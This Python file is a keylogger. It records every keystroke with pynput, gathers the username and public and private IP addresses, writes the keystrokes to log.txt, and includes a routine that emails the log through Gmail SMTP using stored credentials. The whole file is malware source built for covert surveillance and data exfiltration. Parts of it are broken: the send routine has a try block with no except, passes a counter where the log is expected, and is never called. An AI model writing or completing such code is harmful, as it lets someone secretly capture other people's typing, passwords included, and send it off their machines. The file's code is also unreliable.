# -*- coding: utf-8 -*-
"""
Created on Fri Apr  3 21:00:21 2020

@author: vieth
"""

import requests
import socket
import os
import time


import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import config

from pynput.keyboard import Key, Listener

count = 0
keys = []

publicIP = requests.get('https://api.ipify.org').text
privateIP = socket.gethostbyname(socket.gethostname())
user = os.path.expanduser('~').split('\\')[2]
datetime = time.ctime(time.time())

print (privateIP)
print (user)
print(publicIP)

msg = f'\n\n[START OF LOGS]\n  *~ Date/Time: {datetime}\n  *~ User-Profile: {user}\n  *~ Public-IP: {publicIP}\n  *~ Private-IP: {privateIP}\n\n'
keys.append(msg)

def on_press(key):
    global keys, count
    
    #key = str(key).strip('\'')
    
    substitution = ['Key.enter', ' [ENTER]\n', 'Key.backspace', ' [BACKSPACE] ', 'Key.space', ' ',
	'Key.alt_l', ' [ALT] ', 'Key.tab', ' [TAB] ', 'Key.delete', ' [DEL] ', 'Key.ctrl_l', ' [CTRL] ', 
	'Key.left', ' [LEFT ARROW] ', 'Key.right', ' [RIGHT ARROW] ', 'Key.shift', ' [SHIFT] ', '\\x13', 
	' [CTRL-S] ', '\\x17', ' [CTRL-W] ', 'Key.caps_lock', ' [CAPS LK] ', '\\x01', ' [CTRL-A] ', 'Key.cmd', 
	' [WINDOWS KEY] ', 'Key.print_screen', ' [PRNT SCR] ', '\\x03', ' [CTRL-C] ', '\\x16', ' [CTRL-V] ',
    '\\x1a', ' [CTRL-Z] ']

    key = str(key).strip('\'')
    if key in substitution:
        keys.append(substitution[substitution.index(key)+1])
    else:
        keys.append(key)

    count += 1
    print("{0} pressed".format(key))
    
    if count >= 5:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("\'","")
            
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

def on_release(key):
    if key == Key.esc:
        return False

def send_logs():
    count = 0
    
    fromAddr = config.fromAddr
    fromPswd = config.fromPswd
    toAddr = fromAddr
    
    MIN = 10
    SECONDS = 60
    time.sleep(MIN * SECONDS) # every 10 mins write file/send log
    while True:
        if len(keys) > 1:
            try:
                write_file(count)
                subject = f'[{user}] ~ {count}'
                
                msg = MIMEMultipart()
                msg['From'] = fromAddr
                msg['To'] = toAddr
                msg['Subject'] = subject
                body = 'testing'
                
                #in same directory as script
                filename = "log.txt" 
                
                msg.attach(MIMEText(body, "plain"))
                with open(filename, "rb") as attachment:
                    part = MIMEBase("application", "octet-stream")
                    part.set_payload(attachment.read())
                    
                encoders.encode_base64(part)
                part.add_header('content-disposition','attachment;filename=' + str(filename))
                msg.attach(part)
                text = msg.as_string()
                
                s = smtplib.SMTP('smtp.gmail.com', 587)
                s.ehlo()
                s.starttls()
                print('starttls')
                
                s.ehlo()
                s.login(fromAddr,fromPswd)
                s.sendmail(fromAddr,toAddr,text)
                print('sent mail')
                
                attachment.close()
                s.close()
                
                count += 1

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()

